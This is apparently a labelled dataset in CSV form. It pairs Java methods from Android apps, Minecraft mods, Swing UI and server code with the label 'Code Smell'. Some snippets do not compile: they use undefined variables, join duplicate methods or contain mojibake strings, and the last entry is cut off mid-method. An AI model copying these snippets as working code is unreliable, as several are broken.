text,label,text_label
"public void setChatInfo(ChatInfo chatInfo){
  mChatInfo=chatInfo;
  if (chatInfo != null) {
    DraftInfo draftInfo=chatInfo.getDraft();
    if (draftInfo != null && !TextUtils.isEmpty(draftInfo.getDraftText()) && mTextInput != null) {
      Gson gson=new Gson();
      HashMap draftJsonMap;
      String content=draftInfo.getDraftText();
      try {
        draftJsonMap=gson.fromJson(draftInfo.getDraftText(),HashMap.class);
        if (draftJsonMap != null) {
          content=(String)draftJsonMap.get(""content"");
          String draftStr=(String)draftJsonMap.get(""reply"");
          ReplyPreviewBean bean=gson.fromJson(draftStr,ReplyPreviewBean.class);
          if (bean != null) {
            showReplyPreview(bean);
          }
        }
      }
 catch (      JsonSyntaxException e) {
        TUIChatLog.e(TAG,"" getCustomJsonMap error "");
      }
      mTextInput.setText(content);
      mTextInput.setSelection(mTextInput.getText().length());
    }
  }
}
",1,Code Smell
"/** 
 * Add a new IntProperty in the Parallax object. App may override {@link #createProperty(String,int)}.
 * @param name Name of the property.
 * @return Newly created Property object.
 * @see #createProperty(String,int)
 */
public final PropertyT addProperty(String name){
  int newPropertyIndex=mProperties.size();
  PropertyT property=createProperty(name,newPropertyIndex);
  if (property instanceof IntProperty) {
    int size=mValues.length;
    if (size == newPropertyIndex) {
      int[] newValues=new int[size * 2];
      for (int i=0; i < size; i++) {
        newValues[i]=mValues[i];
      }
      mValues=newValues;
    }
    mValues[newPropertyIndex]=IntProperty.UNKNOWN_AFTER;
  }
 else   if (property instanceof FloatProperty) {
    int size=mFloatValues.length;
    if (size == newPropertyIndex) {
      float[] newValues=new float[size * 2];
      for (int i=0; i < size; i++) {
        newValues[i]=mFloatValues[i];
      }
      mFloatValues=newValues;
    }
    mFloatValues[newPropertyIndex]=FloatProperty.UNKNOWN_AFTER;
  }
 else {
    throw new IllegalArgumentException(""Invalid Property type"");
  }
  mProperties.add(property);
  return property;
}",1,Code Smell
"/** 
 * Verify whether the currently logged in user has permission to operate on the current content
 * @param createUserId The creator of the current content
 */
public static void checkOperationPermission(Long createUserId){
  LoginUser loginUser=ContextUtils.getLoginUser();
  if (RoleCodeEnum.DESKTOP.getDefaultUserId().equals(loginUser.getId())) {
    if (RoleCodeEnum.DESKTOP.getDefaultUserId().equals(createUserId)) {
      return;
    }
 else {
      throw new PermissionDeniedBusinessException();
    }
  }
  if (loginUser.getAdmin()) {
    return;
  }
  if (!loginUser.getId().equals(createUserId)) {
    throw new PermissionDeniedBusinessException();
  }
}
",1,Code Smell
"@Override public boolean action(Request request,Response response){
  if (request.getNettyRequest() instanceof FullHttpRequest) {
    InputGetUserInfo inputUserId=getRequestBody(request.getNettyRequest(),InputGetUserInfo.class);
    if (inputUserId != null && (!StringUtil.isNullOrEmpty(inputUserId.getUserId()) || !StringUtil.isNullOrEmpty(inputUserId.getName()) || !StringUtil.isNullOrEmpty(inputUserId.getMobile()))) {
      WFCMessage.User user=null;
      if (!StringUtil.isNullOrEmpty(inputUserId.getUserId())) {
        user=messagesStore.getUserInfo(inputUserId.getUserId());
      }
 else       if (!StringUtil.isNullOrEmpty(inputUserId.getName())) {
        user=messagesStore.getUserInfoByName(inputUserId.getName());
      }
 else       if (!StringUtil.isNullOrEmpty(inputUserId.getMobile())) {
        user=messagesStore.getUserInfoByMobile(inputUserId.getMobile());
      }
      RestResult result;
      if (user == null || StringUtil.isNullOrEmpty(user.getName()) || user.getDeleted() > 0) {
        result=RestResult.resultOf(ErrorCode.ERROR_CODE_NOT_EXIST);
      }
 else {
        if (channelInfo.getOwner().equals(inputUserId.getUserId()) || messagesStore.checkUserInChannel(user.getUid(),channelInfo.getTargetId())) {
          if ((channelInfo.getStatus() & ProtoConstants.ChannelState.Channel_State_Mask_FullInfo) > 0) {
            result=RestResult.ok(InputOutputUserInfo.fromPbUser(user));
          }
 else {
            WFCMessage.User outUser=WFCMessage.User.newBuilder().setUid(user.getUid()).setName(user.getName()).setPortrait(user.getPortrait()).setDisplayName(user.getDisplayName()).build();
            result=RestResult.ok(InputOutputUserInfo.fromPbUser(outUser));
          }
        }
 else {
          if ((channelInfo.getStatus() & ProtoConstants.ChannelState.Channel_State_Mask_Unsubscribed_User_Access) > 0) {
            WFCMessage.User outUser=WFCMessage.User.newBuilder().setUid(user.getUid()).setName(user.getName()).setPortrait(user.getPortrait()).setDisplayName(user.getDisplayName()).build();
            result=RestResult.ok(InputOutputUserInfo.fromPbUser(outUser));
          }
 else {
            result=RestResult.resultOf(ErrorCode.ERROR_CODE_NOT_RIGHT);
          }
        }
      }
      setResponseContent(result,response);
    }
 else {
      setResponseContent(RestResult.resultOf(ErrorCode.INVALID_PARAMETER),response);
    }
  }
  return true;
}",1,Code Smell
"public void setChatEventListener(){
  if (chatPresenter instanceof C2CChatPresenter) {
    c2CChatEventListener=new C2CChatEventListener(){
      @Override public void onRecvMessageModified(      TUIMessageBean changedMessage){
        if (changedMessage != null && messageBean != null && TextUtils.equals(messageBean.getId(),changedMessage.getId())) {
          messageBean.setMessageRepliesBean(changedMessage.getMessageRepliesBean());
          onMessageModified(messageBean);
        }
      }
      @Override public void onMessageChanged(      TUIMessageBean messageBean,      int dataChangeType){
        onRecvMessageModified(messageBean);
      }
    }
;
    TUIChatService.getInstance().addC2CChatEventListener(c2CChatEventListener);
  }
 else {
    groupChatEventListener=new GroupChatEventListener(){
      @Override public void onRecvMessageModified(      TUIMessageBean changedMessage){
        if (changedMessage != null && messageBean != null && TextUtils.equals(messageBean.getId(),changedMessage.getId())) {
          messageBean.setMessageRepliesBean(changedMessage.getMessageRepliesBean());
          onMessageModified(messageBean);
        }
      }
      @Override public void onMessageChanged(      TUIMessageBean messageBean,      int dataChangeType){
        onRecvMessageModified(messageBean);
      }
    }
;
    TUIChatService.getInstance().addGroupChatEventListener(groupChatEventListener);
  }
}",1,Code Smell
"@Nullable @OnlyIn(Dist.CLIENT) public static Boolean relocateClient(Train relocating,boolean simulate){
  Minecraft mc=Minecraft.getInstance();
  HitResult hitResult=mc.hitResult;
  if (!(hitResult instanceof BlockHitResult))   return null;
  BlockPos blockPos=blockhit.getBlockPos();
  BezierTrackPointLocation hoveredBezier=null;
  boolean upsideDown=relocating.carriages.get(0).leadingBogey().isUpsideDown();
  Vec3 offset=upsideDown ? new Vec3(0,-0.5,0) : Vec3.ZERO;
  if (simulate && toVisualise != null && lastHoveredResult != null) {
    for (int i=0; i < toVisualise.size() - 1; i++) {
      Vec3 vec1=toVisualise.get(i).add(offset);
      Vec3 vec2=toVisualise.get(i + 1).add(offset);
      CreateClient.OUTLINER.showLine(Pair.of(relocating,i),vec1.add(0,-.925f,0),vec2.add(0,-.925f,0)).colored(lastHoveredResult || i != toVisualise.size() - 2 ? 0x95CD41 : 0xEA5C2B).disableLineNormals().lineWidth(i % 2 == 1 ? 1 / 6f : 1 / 4f);
    }
  }
  BezierPointSelection bezierSelection=TrackBlockOutline.result;
  if (bezierSelection != null) {
    blockPos=bezierSelection.blockEntity().getBlockPos();
    hoveredBezier=bezierSelection.loc();
  }
  if (simulate) {
    if (lastHoveredPos != null && lastHoveredPos.equals(blockPos) && Objects.equals(lastHoveredBezierSegment,hoveredBezier))     return lastHoveredResult;
    lastHoveredPos=blockPos;
    lastHoveredBezierSegment=hoveredBezier;
    toVisualise=null;
  }
  BlockState blockState=mc.level.getBlockState(blockPos);
  if (!(blockState.getBlock() instanceof ITrackBlock))   return lastHoveredResult=null;
  Vec3 lookAngle=mc.player.getLookAngle();
  boolean direction=bezierSelection != null && lookAngle.dot(bezierSelection.direction()) < 0;
  boolean result=relocate(relocating,mc.level,blockPos,hoveredBezier,direction,lookAngle,true);
  if (!simulate && result) {
    relocating.carriages.forEach(c -> c.forEachPresentEntity(e -> e.nonDamageTicks=10));
    AllPackets.getChannel().sendToServer(new TrainRelocationPacket(relocatingTrain,blockPos,hoveredBezier,direction,lookAngle,relocatingEntityId));
  }
  return lastHoveredResult=result;
}",1,Code Smell
"protected void paintArrow(Graphics2D g){
  int x=0;
  if (isRoundBorderAutoXOffset()) {
    Container parent=getParent();
    boolean vert=(direction == NORTH || direction == SOUTH);
    if (vert && parent instanceof JComponent && FlatUIUtils.hasRoundBorder((JComponent)parent))     x-=scale(parent.getComponentOrientation().isLeftToRight() ? 1 : -1);
  }
  FlatUIUtils.paintArrow(g,x,0,getWidth(),getHeight(),getDirection(),chevron,getArrowWidth(),getArrowThickness(),getXOffset(),getYOffset());
}",1,Code Smell
"private void processLoadedDiceStickers(String name,boolean isEmoji,TLRPC.TL_messages_stickerSet res,boolean cache,int date){
  AndroidUtilities.runOnUIThread(() -> loadingDiceStickerSets.remove(name));
  Utilities.stageQueue.postRunnable(() -> {
    if (cache && (res == null || Math.abs(System.currentTimeMillis() / 1000 - date) >= 60 * 60 * 24)) {
      AndroidUtilities.runOnUIThread(() -> loadStickersByEmojiOrName(name,isEmoji,false),res == null && !cache ? 1000 : 0);
      if (res == null) {
        return;
      }
    }
    if (res != null) {
      if (!cache) {
        putDiceStickersToCache(name,res,date);
      }
      AndroidUtilities.runOnUIThread(() -> {
        diceStickerSetsByEmoji.put(name,res);
        diceEmojiStickerSetsById.put(res.set.id,name);
        getNotificationCenter().postNotificationName(NotificationCenter.diceStickersDidLoad,name);
      }
);
    }
 else     if (!cache) {
      putDiceStickersToCache(name,null,date);
    }
  }
);
}",1,Code Smell
"public Vec3 getPosition(@Nullable TrackGraph trackGraph,double t){
  if (isTurn())   return turn.getPosition(Mth.clamp(t,0,1));
  if (trackGraph != null && (node1.location.yOffsetPixels != 0 || node2.location.yOffsetPixels != 0)) {
    Vec3 positionSmoothed=getPositionSmoothed(trackGraph,t);
    if (positionSmoothed != null)     return positionSmoothed;
  }
  return VecHelper.lerp((float)t,node1.location.getLocation(),node2.location.getLocation());
}",1,Code Smell
"@RequiresPermission(allOf={""android.permission.MANAGE_APP_OPS_MODES"",ManifestCompat.permission.GRANT_RUNTIME_PERMISSIONS,ManifestCompat.permission.REVOKE_RUNTIME_PERMISSIONS}) @WorkerThread private static void persistChanges(@NonNull ApplicationInfo applicationInfo,@NonNull Permission permission,@NonNull AppOpsManagerCompat appOpsManager,boolean mayKillBecauseOfAppOpsChange,@Nullable String revokeReason) throws PermissionException, RemoteException {
  int uid=applicationInfo.uid;
  int userId=UserHandleHidden.getUserId(uid);
  boolean shouldKillApp=false;
  if (!permission.isReadOnly()) {
    if (permission.isGranted()) {
      PermissionCompat.grantPermission(applicationInfo.packageName,permission.getName(),userId);
      Log.d(""PERM"",""Granted %s"",permission.getName());
    }
 else {
      boolean isCurrentlyGranted=PermissionCompat.checkPermission(permission.getName(),applicationInfo.packageName,userId) == PERMISSION_GRANTED;
      if (isCurrentlyGranted) {
        if (revokeReason == null) {
          PermissionCompat.revokePermission(applicationInfo.packageName,permission.getName(),userId);
        }
 else {
          PermissionCompat.revokePermission(applicationInfo.packageName,permission.getName(),userId,revokeReason);
        }
        Log.d(""PERM"",""Revoked %s"",permission.getName());
      }
    }
  }
  if (!permission.readOnly) {
    updateFlags(applicationInfo,permission,userId);
  }
  if (permission.affectsAppOp()) {
    if (!permission.isSystemFixed()) {
      if (permission.isAppOpAllowed()) {
        boolean wasChanged=allowAppOp(appOpsManager,permission.getAppOp(),applicationInfo.packageName,uid);
        shouldKillApp=wasChanged && !supportsRuntimePermissions(applicationInfo);
      }
 else {
        shouldKillApp=disallowAppOp(appOpsManager,permission.getAppOp(),applicationInfo.packageName,uid);
      }
    }
  }
  if (mayKillBecauseOfAppOpsChange && shouldKillApp && SelfPermissions.canKillUid()) {
    ActivityManagerCompat.killUid(uid,KILL_REASON_APP_OP_CHANGE);
  }
  if (userId != UserHandleHidden.myUserId()) {
    BroadcastUtils.sendPackageAltered(ContextUtils.getContext(),new String[]{applicationInfo.packageName});
  }
}
",1,Code Smell
"@Override protected void afterHookedMethod(MethodHookParam param) throws Throwable {
  if ((""market"".equals(getItemId.invoke(param.args[0])) && Helper.prefs.getBoolean(""switch_vipnav"",false)) || (""video"".equals(getItemId.invoke(param.args[0])) && Helper.prefs.getBoolean(""switch_videonav"",false)) || (""friend"".equals(getItemId.invoke(param.args[0])) && Helper.prefs.getBoolean(""switch_friendnav"",false))|| (""panel"".equals(getItemId.invoke(param.args[0])) && Helper.prefs.getBoolean(""switch_panelnav"",false))|| (""find"".equals(getItemId.invoke(param.args[0])) && Helper.prefs.getBoolean(""switch_findnav"",false))) {
    ((View)Tab_tabView.get(param.getResult())).setVisibility(View.GONE);
  }
}",1,Code Smell
"@Override public JSONObject queryById(Integer marketingId,String device){
  AES aes=SecureUtil.aes(BYTES);
  CrmMarketing marketing=getById(marketingId);
  Integer subCount=crmMarketingInfoService.lambdaQuery().eq(CrmMarketingInfo::getMarketingId,marketingId).count();
  JSONObject crmMarketing=BeanUtil.copyProperties(marketing,JSONObject.class);
  Integer crmType=marketing.getCrmType();
  if (Arrays.asList(FIXED_CRM_TYPE).contains(crmType)) {
    if (crmType == 1) {
      crmMarketing.put(""crmTypeName"",""绾跨储"");
    }
 else {
      crmMarketing.put(""crmTypeName"",""瀹㈡埛"");
    }
  }
 else {
    CrmMarketingForm marketingForm=crmMarketingFormService.getById(crmType);
    if (marketingForm != null) {
      crmMarketing.put(""crmTypeName"",marketingForm.getTitle());
    }
  }
  crmMarketing.put(""subCount"",subCount);
  crmMarketing.put(""enMarketingId"",aes.encryptHex(marketing.getMarketingId().toString()));
  crmMarketing.put(""currentUserId"",aes.encryptHex(UserUtil.getUserId().toString()));
  crmMarketing.put(""relationUserInfo"",UserCacheUtil.getSimpleUsers(TagUtil.toLongSet(marketing.getRelationUserId())));
  crmMarketing.put(""relationDeptInfo"",adminService.queryDeptByIds(TagUtil.toSet(marketing.getRelationDeptId())).getData());
  crmMarketing.put(""createUserInfo"",UserCacheUtil.getSimpleUser(marketing.getCreateUserId()));
  if (StrUtil.isNotEmpty(marketing.getDetailFileIds())) {
    List<FileEntity> recordList=adminFileService.queryByIds(TagUtil.toLongSet(marketing.getDetailFileIds())).getData();
    crmMarketing.put(""detailFileList"",recordList);
  }
 else {
    crmMarketing.put(""detailFileList"",new ArrayList<>());
  }
  if (marketing.getMainFileIds() != null) {
    List<FileEntity> recordList=adminFileService.queryByIds(TagUtil.toLongSet(marketing.getMainFileIds())).getData();
    crmMarketing.put(""mainFileList"",recordList);
  }
 else {
    crmMarketing.put(""mainFileList"",new ArrayList<>());
  }
  Integer second=marketing.getSecond();
  Integer count=crmMarketingInfoService.lambdaQuery().eq(CrmMarketingInfo::getMarketingId,marketingId).eq(CrmMarketingInfo::getDevice,device).count();
  if (second == 1 && count > 0) {
    crmMarketing.put(""isAdd"",0);
  }
 else {
    crmMarketing.put(""isAdd"",1);
  }
  if (marketing.getStatus() == 0 || System.currentTimeMillis() > marketing.getEndTime().getTime()) {
    crmMarketing.put(""isEnd"",1);
  }
 else {
    crmMarketing.put(""isEnd"",0);
  }
  return crmMarketing;
}",1,Code Smell
"@Override public void onClickSecondaryFab(FabLayout view,FloatingActionButton fab,int position){
  Context context=getEHContext();
  Activity activity=getActivity2();
  EasyRecyclerView recyclerView=mRecyclerView;
  if (null == context || null == activity || null == recyclerView) {
    return;
  }
  if (0 == position) {
    recyclerView.checkAll();
  }
 else {
    List<DownloadInfo> list=mList;
    if (list == null) {
      return;
    }
    LongList gidList=null;
    List<DownloadInfo> downloadInfoList=null;
    boolean collectGid=position == 1 || position == 2 || position == 3;
    boolean collectDownloadInfo=position == 3 || position == 4;
    if (collectGid) {
      gidList=new LongList();
    }
    if (collectDownloadInfo) {
      downloadInfoList=new LinkedList<>();
    }
    SparseBooleanArray stateArray=recyclerView.getCheckedItemPositions();
    for (int i=0, n=stateArray.size(); i < n; i++) {
      if (stateArray.valueAt(i)) {
        DownloadInfo info=list.get(positionInList(stateArray.keyAt(i)));
        if (collectDownloadInfo) {
          downloadInfoList.add(info);
        }
        if (collectGid) {
          gidList.add(info.gid);
        }
      }
    }
switch (position) {
case 1:
{
        Intent intent=new Intent(activity,DownloadService.class);
        intent.setAction(DownloadService.ACTION_START_RANGE);
        intent.putExtra(DownloadService.KEY_GID_LIST,gidList);
        activity.startService(intent);
        recyclerView.outOfCustomChoiceMode();
        break;
      }
case 2:
{
      if (null != mDownloadManager) {
        mDownloadManager.stopRangeDownload(gidList);
      }
      recyclerView.outOfCustomChoiceMode();
      break;
    }
case 3:
{
    CheckBoxDialogBuilder builder=new CheckBoxDialogBuilder(context,getString(R.string.download_remove_dialog_message_2,gidList.size()),getString(R.string.download_remove_dialog_check_text),Settings.getRemoveImageFiles());
    DeleteRangeDialogHelper helper=new DeleteRangeDialogHelper(downloadInfoList,gidList,builder);
    builder.setTitle(R.string.download_remove_dialog_title).setPositiveButton(android.R.string.ok,helper).show();
    break;
  }
case 4:
{
  List<DownloadLabel> labelRawList=EhApplication.getDownloadManager(context).getLabelList();
  List<String> labelList=new ArrayList<>(labelRawList.size() + 1);
  labelList.add(getString(R.string.default_download_label_name));
  for (int i=0, n=labelRawList.size(); i < n; i++) {
    labelList.add(labelRawList.get(i).getLabel());
  }
  String[] labels=labelList.toArray(new String[labelList.size()]);
  MoveDialogHelper helper=new MoveDialogHelper(labels,downloadInfoList);
  new AlertDialog.Builder(context).setTitle(R.string.download_move_dialog_title).setItems(labels,helper).show();
  break;
}
}
}
}",1,Code Smell
"static void testSensitiveApi() throws Exception {
  List<String> words=Arrays.asList(""a"",""b"",""c"");
  IMResult<Void> addResult=SensitiveAdmin.addSensitives(words);
  if (addResult != null && addResult.getErrorCode() == ErrorCode.ERROR_CODE_SUCCESS) {
    System.out.println(""Add sensitive word response success"");
  }
 else {
    System.out.println(""Add sensitive word response error"");
    System.exit(-1);
  }
  Thread.sleep(100);
  IMResult<InputOutputSensitiveWords> swResult=SensitiveAdmin.getSensitives();
  if (swResult != null && swResult.getErrorCode() == ErrorCode.ERROR_CODE_SUCCESS && swResult.getResult().getWords().containsAll(words)) {
    System.out.println(""Sensitive word added"");
  }
 else {
    System.out.println(""Sensitive word not added"");
    System.exit(-1);
  }
  IMResult<Void> removeResult=SensitiveAdmin.removeSensitives(words);
  if (removeResult != null && removeResult.getErrorCode() == ErrorCode.ERROR_CODE_SUCCESS) {
    System.out.println(""Remove sensitive word response success"");
  }
 else {
    System.out.println(""Remove sensitive word response error"");
    System.exit(-1);
  }
  Thread.sleep(100);
  swResult=SensitiveAdmin.getSensitives();
  if (swResult != null && swResult.getErrorCode() == ErrorCode.ERROR_CODE_SUCCESS && !swResult.getResult().getWords().containsAll(words)) {
    System.out.println(""Sensitive word removed"");
  }
 else {
    System.out.println(""Sensitive word not removed"");
    System.exit(-1);
  }
}",1,Code Smell
"/** 
 * Finds a compatible runtime type if it is more specific
 */
private static Type getRuntimeTypeIfMoreSpecific(Type type,Object value){
  if (value != null && (type == Object.class || type instanceof TypeVariable<?> || type instanceof Class<?>)) {
    type=value.getClass();
  }
  return type;
}
",1,Code Smell
"@Override protected ValueRef getValueRef(ExpressionState state) throws EvaluationException {
  TypedValue context=state.getActiveContextObject();
  Object targetObject=context.getValue();
  TypeDescriptor targetDescriptor=context.getTypeDescriptor();
  TypedValue indexValue=null;
  Object index=null;
  if (targetObject instanceof Map && (this.children[0] instanceof PropertyOrFieldReference)) {
    PropertyOrFieldReference reference=(PropertyOrFieldReference)this.children[0];
    index=reference.getName();
    indexValue=new TypedValue(index);
  }
 else {
    try {
      state.pushActiveContextObject(state.getRootContextObject());
      indexValue=this.children[0].getValueInternal(state);
      index=indexValue.getValue();
    }
  finally {
      state.popActiveContextObject();
    }
  }
  if (targetObject instanceof Map) {
    Object key=index;
    if (targetDescriptor.getMapKeyTypeDescriptor() != null) {
      key=state.convertValue(key,targetDescriptor.getMapKeyTypeDescriptor());
    }
    this.indexedType=IndexedType.MAP;
    return new MapIndexingValueRef(state.getTypeConverter(),(Map<?,?>)targetObject,key,targetDescriptor);
  }
  if (targetObject == null) {
    throw new SpelEvaluationException(getStartPosition(),SpelMessage.CANNOT_INDEX_INTO_NULL_VALUE);
  }
  if (targetObject.getClass().isArray() || targetObject instanceof Collection || targetObject instanceof String) {
    int idx=(Integer)state.convertValue(index,TypeDescriptor.valueOf(Integer.class));
    if (targetObject.getClass().isArray()) {
      this.indexedType=IndexedType.ARRAY;
      return new ArrayIndexingValueRef(state.getTypeConverter(),targetObject,idx,targetDescriptor);
    }
 else     if (targetObject instanceof Collection) {
      if (targetObject instanceof List) {
        this.indexedType=IndexedType.LIST;
      }
      return new CollectionIndexingValueRef((Collection<?>)targetObject,idx,targetDescriptor,state.getTypeConverter(),state.getConfiguration().isAutoGrowCollections(),state.getConfiguration().getMaximumAutoGrowSize());
    }
 else {
      this.indexedType=IndexedType.STRING;
      return new StringIndexingLValue((String)targetObject,idx,targetDescriptor);
    }
  }
  if (String.class == indexValue.getTypeDescriptor().getType()) {
    this.indexedType=IndexedType.OBJECT;
    return new PropertyIndexingValueRef(targetObject,(String)indexValue.getValue(),state.getEvaluationContext(),targetDescriptor);
  }
  throw new SpelEvaluationException(getStartPosition(),SpelMessage.INDEXING_NOT_SUPPORTED_FOR_TYPE,targetDescriptor.toString());
}",1,Code Smell
"/** 
 * update containers in string
 * @param type        container or initContainer
 * @param name
 * @param targetKey
 * @param updateDatas
 * @return
 */
private void updateContainers(String type,String name,String targetKey,JSONArray updateDatas){
  JSONObject workloadSpec=(JSONObject)getWorkloadRef().getSpec();
  log.info(""configmap trait parent workload {}"",workloadSpec.toJSONString());
  JSONArray containers;
  if (workloadSpec.get(""cloneSet"") != null) {
    JSONObject cloneSetSpec=workloadSpec.getJSONObject(""cloneSet"").getJSONObject(""template"").getJSONObject(""spec"");
    containers=cloneSetSpec.getJSONArray(type + ""s"");
  }
 else   if (workloadSpec.get(""advancedStatefulSet"") != null) {
    JSONObject advancedStatefulSetSpec=workloadSpec.getJSONObject(""advancedStatefulSet"").getJSONObject(""template"").getJSONObject(""spec"");
    containers=advancedStatefulSetSpec.getJSONArray(type + ""s"");
  }
 else   if (""Deployment"".equals(workloadSpec.getString(""kind""))) {
    containers=workloadSpec.getJSONArray(type + ""s"");
  }
 else {
    throw new AppException(AppErrorCode.INVALID_USER_ARGS,""not supported"");
  }
  for (int i=0; i < containers.size(); i++) {
    JSONObject container=containers.getJSONObject(i);
    if (!Objects.equals(container.getString(""name""),name)) {
      log.info(""container name not match {} {}"",container.getString(""name""),name);
      continue;
    }
    container.putIfAbsent(targetKey,new JSONArray());
    JSONArray target=container.getJSONArray(targetKey);
    for (int j=0; j < updateDatas.size(); j++) {
      JSONObject updateData=updateDatas.getJSONObject(j);
      log.info(""update container {} {}"",target.toJSONString(),updateData.toJSONString());
      target.add(updateData);
    }
  }
  log.info(""configmap trait parent workload after update {}"",workloadSpec.toJSONString());
}",1,Code Smell
"private String readResponse() throws IOException {
  if (firstRead) {
    try {
      if (!readReadySignal.await(2,TimeUnit.SECONDS)) {
        throw new IOException(""Read thread did not start"");
      }
    }
 catch (    InterruptedException e) {
      throw new IOException(""Read ready await interrupted"");
    }
  }
  try {
    if (!readLock.tryLock((readTimeouts[readTimeoutIndex] * 1000L) + (requestIdCount * PER_REQUEST_READ_TIMEOUT_MILLIS),TimeUnit.MILLISECONDS)) {
      readTimeoutIndex=Math.min(readTimeoutIndex + 1,readTimeouts.length - 1);
      log.warn(""No response from server, setting read timeout to "" + readTimeouts[readTimeoutIndex] + "" secs"");
      throw new IOException(""No response from server"");
    }
  }
 catch (  InterruptedException e) {
    throw new IOException(""Read thread interrupted"");
  }
  if (readTimeoutIndex == readTimeouts.length - 1) {
    readTimeoutIndex--;
  }
  try {
    if (firstRead) {
      readingCondition.signal();
      firstRead=false;
    }
    while (reading) {
      try {
        readingCondition.await();
      }
 catch (      InterruptedException e) {
        Thread.currentThread().interrupt();
        break;
      }
    }
    if (lastException != null) {
      throw new IOException(""Error reading response: "" + lastException.getMessage(),lastException);
    }
    reading=true;
    readingCondition.signal();
    return response;
  }
  finally {
    readLock.unlock();
  }
}",1,Code Smell
"@Inject(method=""clear"",at=@At(""HEAD"")) private void iris$unlockDepthColorState(CallbackInfo ci){
  if (((Object)this) instanceof ExtendedShader || ((Object)this) instanceof FallbackShader || !shouldOverrideShaders()) {
    return;
  }
  DepthColorStorage.unlockDepthColor();
}
",1,Code Smell
"@Override protected void beforeHookedMethod(MethodHookParam param){
  if (NextContentAnimationView.isAssignableFrom(param.thisObject.getClass()) || (NextContentAnimationView_short != null && NextContentAnimationView_short.isAssignableFrom(param.args[0].getClass())))   param.args[0]=View.GONE;
}",1,Code Smell
"/** 
 * Check if the path has a relative path
 * @param path
 * @return
 */
public static boolean containsRelativePath(String path){
  if (path.startsWith(""./"") || path.contains(""/./"") || path.startsWith(""../"")|| path.contains(""/../"")) {
    return true;
  }
  if (path.startsWith("".\\"") || path.contains(""\\.\\"") || path.startsWith(""..\\"")|| path.contains(""\\..\\"")) {
    return true;
  }
  return false;
}
",1,Code Smell
"protected void ensureSelectedTabIsVisible(){
  if (tabPane == null || tabViewport == null || !tabPane.isDisplayable())   return;
  ensureCurrentLayout();
  int selectedIndex=tabPane.getSelectedIndex();
  if (selectedIndex < 0 || selectedIndex >= rects.length)   return;
  ((JComponent)tabViewport.getView()).scrollRectToVisible((Rectangle)rects[selectedIndex].clone());
}",1,Code Smell
"protected PaveResult tryFill(MovementContext context,BlockPos targetPos,BlockState toPlace){
  Level level=context.world;
  if (!level.isLoaded(targetPos))   return PaveResult.FAIL;
  BlockState existing=level.getBlockState(targetPos);
  if (existing.is(toPlace.getBlock()))   return PaveResult.PASS;
  if (!existing.is(BlockTags.LEAVES) && !existing.canBeReplaced() && (!existing.getCollisionShape(level,targetPos).isEmpty() || existing.is(BlockTags.PORTALS)))   return PaveResult.FAIL;
  FilterItemStack filter=context.getFilterFromBE();
  ItemStack held=ItemHelper.extract(context.contraption.getSharedInventory(),stack -> filter.test(context.world,stack),1,false);
  if (held.isEmpty())   return PaveResult.FAIL;
  level.setBlockAndUpdate(targetPos,toPlace);
  return PaveResult.SUCCESS;
}",1,Code Smell
"private void recheckScroll(){
  final EmptyRecyclerView.MyLinearLayoutManager layoutMan=(EmptyRecyclerView.MyLinearLayoutManager)mRecyclerView.getLayoutManager();
  assert layoutMan != null;
  int first_visibile_pos=layoutMan.findFirstCompletelyVisibleItemPosition();
  int last_visible_pos=layoutMan.findLastCompletelyVisibleItemPosition();
  int last_pos=mAdapter.getItemCount() - 1;
  boolean reached_bottom=(last_visible_pos >= last_pos);
  boolean is_scrolling=(first_visibile_pos != 0) || (!reached_bottom);
  if (is_scrolling) {
    if (reached_bottom) {
      autoScroll=true;
      showFabDown(false);
    }
 else {
      autoScroll=false;
      showFabDown(true);
    }
  }
 else   showFabDown(false);
}",1,Code Smell
"@Override protected PropertyChangeListener createPropertyChangeListener(){
  PropertyChangeListener superListener=super.createPropertyChangeListener();
  return e -> {
    superListener.propertyChange(e);
    Object source=e.getSource();
    String propertyName=e.getPropertyName();
    if (editor != null && ((source == comboBox && propertyName == ""foreground"") || (source == editor && propertyName == ""enabled""))) {
      updateEditorColors();
    }
 else     if (editor != null && source == comboBox && propertyName == ""componentOrientation"") {
      ComponentOrientation o=(ComponentOrientation)e.getNewValue();
      editor.applyComponentOrientation(o);
    }
 else {
switch (propertyName) {
case PLACEHOLDER_TEXT:
        if (editor != null)         HiDPIUtils.repaint(editor);
      break;
case COMPONENT_ROUND_RECT:
case OUTLINE:
    HiDPIUtils.repaint(comboBox);
  break;
case MINIMUM_WIDTH:
comboBox.revalidate();
break;
case STYLE:
case STYLE_CLASS:
installStyle();
comboBox.revalidate();
HiDPIUtils.repaint(comboBox);
break;
}
}
}
;
}
@Override protected PropertyChangeListener createPropertyChangeListener(){
  PropertyChangeListener superListener=super.createPropertyChangeListener();
  return e -> {
    superListener.propertyChange(e);
    if (e.getPropertyName() == ""renderer"")     list.setCellRenderer(new PopupListCellRenderer());
  }
;
}
",1,Code Smell
"@Override public boolean isValid(@Nullable Random value,@NonNull AnnotationValue<RandomRetryValidation> annotationMetadata,@NonNull ConstraintValidatorContext context){
  if (value == null) {
    return true;
  }
  if (value.getMaxDuration() != null && value.getMaxInterval() != null && value.getMaxDuration().compareTo(value.getMinInterval()) <= 0) {
    context.disableDefaultConstraintViolation();
    context.buildConstraintViolationWithTemplate(""'minInterval' must be less than 'maxDuration' but is "" + value.getMinInterval()).addConstraintViolation();
    return false;
  }
  if (value.getMaxDuration() != null && value.getMaxInterval() != null && value.getMaxDuration().compareTo(value.getMaxInterval()) <= 0) {
    context.disableDefaultConstraintViolation();
    context.buildConstraintViolationWithTemplate(""'maxInterval' must be less than 'maxDuration' but is "" + value.getMaxInterval()).addConstraintViolation();
    return false;
  }
  if (value.getMaxInterval() != null && value.getMinInterval() != null && value.getMaxInterval().compareTo(value.getMinInterval()) <= 0) {
    context.disableDefaultConstraintViolation();
    context.buildConstraintViolationWithTemplate(""'minInterval' must be less than 'maxInterval' but is "" + value.getMinInterval()).addConstraintViolation();
    return false;
  }
  return true;
}",1,Code Smell
"@Override public void onScrolled(RecyclerView recyclerView,int dx,int dy){
  int firstVisibleItem=searchLayoutManager.findFirstVisibleItemPosition();
  int lastVisibleItem=searchLayoutManager.findLastVisibleItemPosition();
  int visibleItemCount=Math.abs(searchLayoutManager.findLastVisibleItemPosition() - firstVisibleItem) + 1;
  int totalItemCount=recyclerView.getAdapter().getItemCount();
